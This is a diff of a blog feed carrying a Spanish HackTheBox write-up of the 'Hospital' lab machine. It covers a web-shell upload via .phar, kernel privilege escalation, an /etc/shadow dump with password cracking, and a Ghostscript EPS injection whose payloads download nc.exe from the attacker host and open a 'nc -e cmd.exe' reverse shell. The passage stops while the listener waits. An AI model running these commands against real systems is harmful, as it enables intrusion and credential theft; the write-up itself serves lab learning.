@@ -1,5 +1,1159 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-05-07T16:21:52-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">MiguelRega7 - blog</title><subtitle>Posts sobre resolución de CTFs y ciberseguridad.
-</subtitle><author><name>MiguelRega7</name></author><entry><title type="html">HackTheBox - Sizzle (insane)</title><link href="http://localhost:4000/hackthebox/machines/insane/2024/05/07/sizzle.html" rel="alternate" type="text/html" title="HackTheBox - Sizzle (insane)" /><published>2024-05-07T00:00:00-06:00</published><updated>2024-05-07T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/insane/2024/05/07/sizzle</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/insane/2024/05/07/sizzle.html"><![CDATA[<p align="center">
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-05-12T12:24:28-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">MiguelRega7 - blog</title><subtitle>Posts sobre resolución de CTFs y ciberseguridad.
+</subtitle><author><name>MiguelRega7</name></author><entry><title type="html">HackTheBox - Hospital (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/05/12/hospital.html" rel="alternate" type="text/html" title="HackTheBox - Hospital (medium)" /><published>2024-05-12T00:00:00-06:00</published><updated>2024-05-12T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/05/12/hospital</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/05/12/hospital.html"><![CDATA[<p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/e980d18b909fa0ba8f519cf9777fd413.png" />
+</p>
+
+<ul>
+  <li>Hospital is a medium-difficulty Windows machine that hosts an Active Directory environment, a web server, and a RoundCube instance. The web application has a file upload vulnerability that allows the execution of arbitrary PHP code, leading to a reverse shell on the Linux virtual machine hosting the service. Enumerating the system reveals an outdated Linux kernel that can be exploited to gain root privileges, via CVE-2023-35001. Privileged access allows /etc/shadow hashes to be read and subsequently cracked, yielding credentials for the RoundCube instance. Emails on the service hint towards the use of GhostScript, which opens up the target to exploitation via , a vulnerability exploited by crafting a malicious Embedded PostScript (EPS) file to achieve remote code execution on the Windows host. System access is then obtained by either of two ways: using a keylogger to capture administrator credentials, or by abusing misconfigured XAMPP permissions.</li>
+</ul>
+
+<h2 id="portscan">PortScan</h2>
+
+<ul>
+  <li>Comenzamos escaneando los puertos abiertos por el protocolo TCP.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,88,135,139,389,443,445,464,593,636,1801,2103,2105,2107,2179,3268,3269,3389,5985,6404,6406,6407,6409,6616,6631,6647,9389 10.10.11.241 <span class="nt">-oN</span> targeted
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-05-11 15:32 CST
+Nmap scan report <span class="k">for </span>10.10.11.241
+Host is up <span class="o">(</span>0.17s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT     STATE SERVICE           VERSION
+53/tcp   open  domain            Simple DNS Plus
+88/tcp   open  kerberos-sec      Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-05-12 04:32:45Z<span class="o">)</span>
+135/tcp  open  msrpc             Microsoft Windows RPC
+139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
+389/tcp  open  ldap              Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: hospital.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC
+| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+| Not valid before: 2023-09-06T10:49:03
+|_Not valid after:  2028-09-06T10:49:03
+443/tcp  open  ssl/http          Apache httpd 2.4.56 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1t PHP/8.0.28<span class="o">)</span>
+|_http-server-header: Apache/2.4.56 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1t PHP/8.0.28
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>localhost
+| Not valid before: 2009-11-10T23:48:47
+|_Not valid after:  2019-11-08T23:48:47
+|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+| tls-alpn:
+|_  http/1.1
+|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ldapssl?
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC
+| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+| Not valid before: 2023-09-06T10:49:03
+|_Not valid after:  2028-09-06T10:49:03
+1801/tcp open  msmq?
+2103/tcp open  msrpc             Microsoft Windows RPC
+2105/tcp open  msrpc             Microsoft Windows RPC
+2107/tcp open  msrpc             Microsoft Windows RPC
+2179/tcp open  vmrdp?
+3268/tcp open  ldap              Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: hospital.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC
+| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+| Not valid before: 2023-09-06T10:49:03
+|_Not valid after:  2028-09-06T10:49:03
+3269/tcp open  globalcatLDAPssl?
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC
+| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+| Not valid before: 2023-09-06T10:49:03
+|_Not valid after:  2028-09-06T10:49:03
+3389/tcp open  ms-wbt-server     Microsoft Terminal Services
+| rdp-ntlm-info:
+|   Target_Name: HOSPITAL
+|   NetBIOS_Domain_Name: HOSPITAL
+|   NetBIOS_Computer_Name: DC
+|   DNS_Domain_Name: hospital.htb
+|   DNS_Computer_Name: DC.hospital.htb
+|   DNS_Tree_Name: hospital.htb
+|   Product_Version: 10.0.17763
+|_  System_Time: 2024-05-12T04:33:41+00:00
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC.hospital.htb
+| Not valid before: 2024-05-10T04:42:39
+|_Not valid after:  2024-11-09T04:42:39
+5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+6404/tcp open  msrpc             Microsoft Windows RPC
+6406/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+6407/tcp open  msrpc             Microsoft Windows RPC
+6409/tcp open  msrpc             Microsoft Windows RPC
+6616/tcp open  msrpc             Microsoft Windows RPC
+6631/tcp open  msrpc             Microsoft Windows RPC
+6647/tcp open  msrpc             Microsoft Windows RPC
+9389/tcp open  mc-nmf            .NET Message Framing
+Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled and required
+|_clock-skew: mean: 6h59m57s, deviation: 0s, median: 6h59m57s
+| smb2-time:
+|   <span class="nb">date</span>: 2024-05-12T04:33:44
+|_  start_date: N/A
+</code></pre></div></div>
+
+<h2 id="enumeración">Enumeración</h2>
+
+<ul>
+  <li>Vamos agregar los nombres de dominio que nos dio <code class="language-plaintext highlighter-rouge">Nmap</code> también que prácticamente son los mismos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="s2">"10.10.11.241 DC.hospital.htb hospital.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+10.10.11.241 DC.hospital.htb hospital.htb
+</code></pre></div></div>
+
+<ul>
+  <li>No podemos enumerar recursos compartidos por <code class="language-plaintext highlighter-rouge">smb</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap cme smb 10.10.11.241 <span class="nt">--shares</span>
+SMB         10.10.11.241    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:hospital.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.11.241    445    DC               <span class="o">[</span>-] Error enumerating shares: <span class="o">[</span>Errno 32] Broken pipe
+➜  nmap cme smb 10.10.11.241 <span class="nt">-u</span> <span class="s1">'admin'</span> <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">--shares</span>
+SMB         10.10.11.241    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:hospital.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.11.241    445    DC               <span class="o">[</span>-] hospital.htb<span class="se">\a</span>dmin: STATUS_LOGON_FAILURE
+➜  nmap smbmap <span class="nt">-H</span> 10.10.11.241 <span class="nt">--no-banner</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 0 SMB session<span class="o">(</span>s<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Tampoco por el protocolo <code class="language-plaintext highlighter-rouge">RPC</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s1">''</span> 10.10.11.241
+Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
+</code></pre></div></div>
+
+<ul>
+  <li>En el puerto 443 vemos un panel de <code class="language-plaintext highlighter-rouge">login</code> credenciales por defecto no funcionan.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/hospital/1.png" />
+</p>
+
+<ul>
+  <li>En el puerto <code class="language-plaintext highlighter-rouge">8080</code> tenemos un panel de <code class="language-plaintext highlighter-rouge">login</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/hospital/2.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Vamos a crear una cuenta ya que no tenemos una para conectarnos.</p>
+  </li>
+  <li>
+    <p>Una vez tenemos nuestra cuenta nos podemos conectar y algo ya que llama la atención es la parte de subir archivos.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/hospital/3.png" />
+</p>
+
+<ul>
+  <li>Como la pagina web interpreta <code class="language-plaintext highlighter-rouge">php</code> podemos intentar subir <code class="language-plaintext highlighter-rouge">.php</code> para ver si funciona.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="s2">"&lt;?php system("</span><span class="nb">id</span><span class="s2">"); ?&gt;"</span> <span class="o">&gt;</span> test.php
+</code></pre></div></div>
+
+<ul>
+  <li>Al subirlo me da error.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/hospital/4.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Vamos a probar con un <code class="language-plaintext highlighter-rouge">jpg</code>.</p>
+  </li>
+  <li>
+    <p>Y funciona.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/hospital/5.png" />
+</p>
+
+<ul>
+  <li>Vamos a ver si existe la ruta donde se suban las cosas.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  content gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://hospital.htb:8080/ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-t</span> 80 <span class="nt">--no-error</span>
+<span class="o">===============================================================</span>
+Gobuster v3.6
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:                     http://hospital.htb:8080/
+<span class="o">[</span>+] Method:                  GET
+<span class="o">[</span>+] Threads:                 80
+<span class="o">[</span>+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+<span class="o">[</span>+] Negative Status codes:   404
+<span class="o">[</span>+] User Agent:              gobuster/3.6
+<span class="o">[</span>+] Timeout:                 10s
+<span class="o">===============================================================</span>
+Starting gobuster <span class="k">in </span>directory enumeration mode
+<span class="o">===============================================================</span>
+/images               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 320] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://hospital.htb:8080/images/]
+/uploads              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 321] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://hospital.htb:8080/uploads/]
+/css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 317] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://hospital.htb:8080/css/]
+/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 316] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://hospital.htb:8080/js/]
+/vendor               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 320] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://hospital.htb:8080/vendor/]
+/fonts                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 319] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://hospital.htb:8080/fonts/]
+</code></pre></div></div>
+
+<ul>
+  <li>Y bueno lo mas probable es que no podremos ver nada.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/hospital/6.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Lo que vamos hacer es capturar la petición con <code class="language-plaintext highlighter-rouge">burpsuite</code> y ver que otras extensiones podemos usar para interpretar código <code class="language-plaintext highlighter-rouge">php</code>.</p>
+  </li>
+  <li>
+    <p>Vamos a <code class="language-plaintext highlighter-rouge">fuzzear</code> por la extensión en el <code class="language-plaintext highlighter-rouge">intruder</code> de momento dejamos estas.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/hospital/7.png" />
+</p>
+
+<ul>
+  <li>Si observamos la respuesta en <code class="language-plaintext highlighter-rouge">.phar</code> vemos que nos un <code class="language-plaintext highlighter-rouge">success.php</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/hospital/8.png" />
+</p>
+
+<blockquote>
+  <p>En el software, un archivo PHAR es un formato de paquete que permite la distribución de aplicaciones y bibliotecas al agrupar muchos archivos de código PHP y otros recursos en un solo archivo.</p>
+</blockquote>
+
+<h2 id="shell-as-www-data">Shell as www-data</h2>
+
+<ul>
+  <li>Ahora lo que vamos hacer es subir lo siguiente <a href="https://github.com/flozz/p0wny-shell">https://github.com/flozz/p0wny-shell</a> pero lo pondremos en <code class="language-plaintext highlighter-rouge">.phar</code> para que pueda interpretarlo y así estar mas cómodos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content git clone https://github.com/flozz/p0wny-shell
+Cloning into <span class="s1">'p0wny-shell'</span>...
+remote: Enumerating objects: 215, <span class="k">done</span><span class="nb">.</span>
+remote: Counting objects: 100% <span class="o">(</span>137/137<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
+remote: Compressing objects: 100% <span class="o">(</span>54/54<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
+remote: Total 215 <span class="o">(</span>delta 94<span class="o">)</span>, reused 110 <span class="o">(</span>delta 82<span class="o">)</span>, pack-reused 78
+Receiving objects: 100% <span class="o">(</span>215/215<span class="o">)</span>, 117.41 KiB | 626.00 KiB/s, <span class="k">done</span><span class="nb">.</span>
+Resolving deltas: 100% <span class="o">(</span>124/124<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
+➜  content <span class="nb">cd </span>p0wny-shell
+➜  p0wny-shell git:<span class="o">(</span>master<span class="o">)</span> <span class="nb">ls
+</span>Dockerfile  LICENSE  README.md  RELEASE.rst  screenshot.png  shell.php
+➜  p0wny-shell git:<span class="o">(</span>master<span class="o">)</span> <span class="nb">mv </span>shell.php shell.phar
+</code></pre></div></div>
+
+<ul>
+  <li>Después de subir el <code class="language-plaintext highlighter-rouge">.phar</code> como ya sabemos el nombre y la ruta donde guarda los archivos ya podemos ejecutar comandos.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/hospital/9.png" />
+</p>
+
+<ul>
+  <li>Ahora nos vamos enviar una <code class="language-plaintext highlighter-rouge">reverse shell</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+</code></pre></div></div>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/hospital/10.png" />
+</p>
+
+<ul>
+  <li>Recibimos la <code class="language-plaintext highlighter-rouge">shell</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.71] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.241] 6602
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>974<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+www-data@webserver:/var/www/html/uploads<span class="err">$</span>
+</code></pre></div></div>
+
+<h2 id="root">Root</h2>
+
+<ul>
+  <li>La versión del <code class="language-plaintext highlighter-rouge">kernel</code> es vieja y es vulnerable <a href="https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629">https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@webserver:/var/www/html/uploads<span class="nv">$ </span><span class="nb">uname</span> <span class="nt">-r</span>
+5.19.0-35-generic
+www-data@webserver:/var/www/html/uploads<span class="err">$</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Al ejecutar el script nos convertiremos en <code class="language-plaintext highlighter-rouge">root</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@webserver:/tmp<span class="nv">$ </span><span class="nb">chmod</span> +x exploit.sh
+www-data@webserver:/tmp<span class="nv">$ </span>./exploit.sh
+<span class="o">[</span>+] You should be root now
+<span class="o">[</span>+] Type <span class="s1">'exit'</span> to finish and leave the house cleaned
+root@webserver:/tmp#
+</code></pre></div></div>
+
+<ul>
+  <li>No hay nada interesante como una flag ni nada pero como somos <code class="language-plaintext highlighter-rouge">root</code> y el usuario <code class="language-plaintext highlighter-rouge">drwilliams</code> existe podemos ver el <code class="language-plaintext highlighter-rouge">/etc/shadow</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@webserver:/home/drwilliams# <span class="nb">cat</span> /etc/shadow
+
+root:<span class="nv">$y$j9T$s</span>/Aqv48x449udndpLC6eC.<span class="nv">$WUkrXgkW46N4xdpnhMoax7US</span>.JgyJSeobZ1dzDs..dD:19612:0:99999:7:::
+daemon:<span class="k">*</span>:19462:0:99999:7:::
+bin:<span class="k">*</span>:19462:0:99999:7:::
+sys:<span class="k">*</span>:19462:0:99999:7:::
+<span class="nb">sync</span>:<span class="k">*</span>:19462:0:99999:7:::
+games:<span class="k">*</span>:19462:0:99999:7:::
+man:<span class="k">*</span>:19462:0:99999:7:::
+lp:<span class="k">*</span>:19462:0:99999:7:::
+mail:<span class="k">*</span>:19462:0:99999:7:::
+news:<span class="k">*</span>:19462:0:99999:7:::
+uucp:<span class="k">*</span>:19462:0:99999:7:::
+proxy:<span class="k">*</span>:19462:0:99999:7:::
+www-data:<span class="k">*</span>:19462:0:99999:7:::
+backup:<span class="k">*</span>:19462:0:99999:7:::
+list:<span class="k">*</span>:19462:0:99999:7:::
+irc:<span class="k">*</span>:19462:0:99999:7:::
+_apt:<span class="k">*</span>:19462:0:99999:7:::
+nobody:<span class="k">*</span>:19462:0:99999:7:::
+systemd-network:!<span class="k">*</span>:19462::::::
+systemd-timesync:!<span class="k">*</span>:19462::::::
+messagebus:!:19462::::::
+systemd-resolve:!<span class="k">*</span>:19462::::::
+pollinate:!:19462::::::
+sshd:!:19462::::::
+syslog:!:19462::::::
+uuidd:!:19462::::::
+tcpdump:!:19462::::::
+tss:!:19462::::::
+landscape:!:19462::::::
+fwupd-refresh:!:19462::::::
+drwilliams:<span class="nv">$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w</span>/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
+lxd:!:19612::::::
+mysql:!:19620::::::
+root@webserver:/home/drwilliams#
+</code></pre></div></div>
+
+<h2 id="shell-as-drbrown">Shell as drbrown</h2>
+
+<ul>
+  <li>Obtenemos la contraseña.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
+</span>Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>sha512crypt, crypt<span class="o">(</span>3<span class="o">)</span> <span class="nv">$6$ </span><span class="o">[</span>SHA512 512/512 AVX512BW 8x]<span class="o">)</span>
+Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 5000 <span class="k">for </span>all loaded hashes
+Will run 2 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+qwe123!@#        <span class="o">(</span>drwilliams<span class="o">)</span>
+1g 0:00:01:04 DONE <span class="o">(</span>2024-05-11 16:52<span class="o">)</span> 0.01554g/s 3334p/s 3334c/s 3334C/s raycharles..pl@yboy
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed.
+</code></pre></div></div>
+
+<ul>
+  <li>Podemos usar las credenciales en el panel de administración.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/hospital/11.png" />
+</p>
+
+<ul>
+  <li>Vemos esto.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/hospital/12.png" />
+</p>
+
+<ul>
+  <li>Encontramos información útil.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/hospital/13.png" />
+</p>
+
+<blockquote>
+  <p>PostScript encapsulado, o EPS, es un formato de archivo gráfico. Un archivo EPS es un archivo PostScript que satisface algunas restricciones adicionales. Estas restricciones intentan hacer más fácil a programas de software el incluir un archivo EPS dentro de otro documento PostScript.</p>
+</blockquote>
+
+<ul>
+  <li>El Dr. Brown quiere que le enviemos un archivo con la extensión <code class="language-plaintext highlighter-rouge">.eps</code>  y nos habla sobre <a href="https://www.ghostscript.com/">https://www.ghostscript.com/</a> que es el que interpreta el <code class="language-plaintext highlighter-rouge">PostScript</code> si investigamos sobre esto encontramos una vulnerabilidad en <code class="language-plaintext highlighter-rouge">Ghostscript</code> <a href="https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection">https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection</a> en la que podemos hacer una inyección de comandos en un <code class="language-plaintext highlighter-rouge">.eps</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content git clone https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection
+Cloning into <span class="s1">'CVE-2023-36664-Ghostscript-command-injection'</span>...
+remote: Enumerating objects: 34, <span class="k">done</span><span class="nb">.</span>
+remote: Counting objects: 100% <span class="o">(</span>34/34<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
+remote: Compressing objects: 100% <span class="o">(</span>32/32<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
+remote: Total 34 <span class="o">(</span>delta 15<span class="o">)</span>, reused 5 <span class="o">(</span>delta 1<span class="o">)</span>, pack-reused 0
+Receiving objects: 100% <span class="o">(</span>34/34<span class="o">)</span>, 71.69 KiB | 407.00 KiB/s, <span class="k">done</span><span class="nb">.</span>
+Resolving deltas: 100% <span class="o">(</span>15/15<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
+➜  content <span class="nb">cd </span>CVE-2023-36664-Ghostscript-command-injection
+➜  CVE-2023-36664-Ghostscript-command-injection git:<span class="o">(</span>main<span class="o">)</span> <span class="nb">ls
+</span>CVE_2023_36664_exploit.py  README.md  file.eps  file.ps  flowchart.png  vsociety.jpg
+➜  CVE-2023-36664-Ghostscript-command-injection git:<span class="o">(</span>main<span class="o">)</span> python3 CVE_2023_36664_exploit.py
+<span class="o">[</span>-] Either <span class="nt">--payload</span> or <span class="nt">--revshell</span> is required.
+</code></pre></div></div>
+
+<ul>
+  <li>Para ganar acceso necesitamos subir el ejecutable de <code class="language-plaintext highlighter-rouge">netcat</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  CVE-2023-36664-Ghostscript-command-injection git:<span class="o">(</span>main<span class="o">)</span> ✗ python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  CVE-2023-36664-Ghostscript-command-injection git:<span class="o">(</span>main<span class="o">)</span> <span class="nb">cp</span> /usr/share/seclists/Web-Shells/FuzzDB/nc.exe <span class="nb">.</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  CVE-2023-36664-Ghostscript-command-injection git:<span class="o">(</span>main<span class="o">)</span> ✗ python3 CVE_2023_36664_exploit.py <span class="nt">--inject</span> <span class="nt">--payload</span> <span class="s2">"curl 10.10.14.71:80/nc.exe -o nc.exe"</span> <span class="nt">--filename</span> file.eps
+<span class="o">[</span>+] Payload successfully injected into file.eps.
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a enviar el <code class="language-plaintext highlighter-rouge">.eps</code> al <code class="language-plaintext highlighter-rouge">Dr.Brown</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/hospital/14.png" />
+</p>
+
+<ul>
+  <li>Una vez enviamos el mensaje nos llega la solicitud que descargo el <code class="language-plaintext highlighter-rouge">nc.exe</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  CVE-2023-36664-Ghostscript-command-injection git:<span class="o">(</span>main<span class="o">)</span> ✗ python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+10.10.11.241 - - <span class="o">[</span>11/May/2024 18:36:30] <span class="s2">"GET /nc.exe HTTP/1.1"</span> 200 -
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora nos vamos a enviar una <code class="language-plaintext highlighter-rouge">reverse shell</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  CVE-2023-36664-Ghostscript-command-injection git:<span class="o">(</span>main<span class="o">)</span> ✗ rlwrap nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  CVE-2023-36664-Ghostscript-command-injection git:<span class="o">(</span>main<span class="o">)</span> ✗ python3 CVE_2023_36664_exploit.py <span class="nt">--inject</span> <span class="nt">--payload</span> <span class="s2">"nc.exe 10.10.14.71 443 -e cmd.exe"</span> <span class="nt">--filename</span> file.eps
+<span class="o">[</span>+] Payload successfully injected into file.eps.
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Y de igual manera enviamos por correo al mismo destinatario el <code class="language-plaintext highlighter-rouge">file.eps</code>.</p>
+  </li>
+  <li>
+    <p>Nos llega la shell.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  CVE-2023-36664-Ghostscript-command-injection git:<span class="o">(</span>main<span class="o">)</span> ✗ rlwrap nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
